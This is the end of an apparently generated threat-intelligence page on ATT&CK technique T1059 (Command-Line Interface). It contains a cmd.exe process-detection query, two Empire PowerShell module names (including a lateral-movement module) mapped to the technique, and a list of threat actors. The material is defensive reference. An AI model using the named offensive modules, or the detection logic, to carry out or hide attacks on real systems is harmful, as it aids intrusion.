                           'name': 'Command-Line Interface',
                           'phase': 'Execution',
                           'query': [{'process': {'image': {'flag': 'regex',
                                                            'pattern': '\\\\Windows\\\\.+\\\\cmd.exe'}},
                                      'type': 'process'},
                                     {'process': {'cmdline': {'op': 'and',
                                                              'pattern': 'cmd.exe|/c'}},
                                      'type': 'process'}]}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1059',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/lateral_movement/invoke_sqloscmd":  '
                                                                                 '["T1059"],',
                                            'Empire Module': 'powershell/lateral_movement/invoke_sqloscmd',
                                            'Technique': 'Command-Line '
                                                         'Interface'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1059',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/spawnas":  '
                                                                                 '["T1059"],',
                                            'Empire Module': 'powershell/management/spawnas',
                                            'Technique': 'Command-Line '
                                                         'Interface'}}]
```

# Tactics


* [Execution](../tactics/Execution.md)


# Mitigations

None

# Actors


* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)

* [Leviathan](../actors/Leviathan.md)
    
* [APT37](../actors/APT37.md)
    
* [APT1](../actors/APT1.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [Gorgon Group](../actors/Gorgon-Group.md)
    
* [Ke3chang](../actors/Ke3chang.md)
    
* [APT28](../actors/APT28.md)
    
* [admin@338](../actors/admin@338.md)
    
* [APT3](../actors/APT3.md)
    
* [menuPass](../actors/menuPass.md)
    
* [FIN8](../actors/FIN8.md)
    
* [Threat Group-1314](../actors/Threat-Group-1314.md)
    
* [FIN7](../actors/FIN7.md)
    
* [Sowbug](../actors/Sowbug.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Rancor](../actors/Rancor.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Suckfly](../actors/Suckfly.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [APT38](../actors/APT38.md)
    
* [APT18](../actors/APT18.md)
    
* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [Honeybee](../actors/Honeybee.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [APT32](../actors/APT32.md)
    
* [Silence](../actors/Silence.md)
    
* [Turla](../actors/Turla.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
* [APT41](../actors/APT41.md)
    
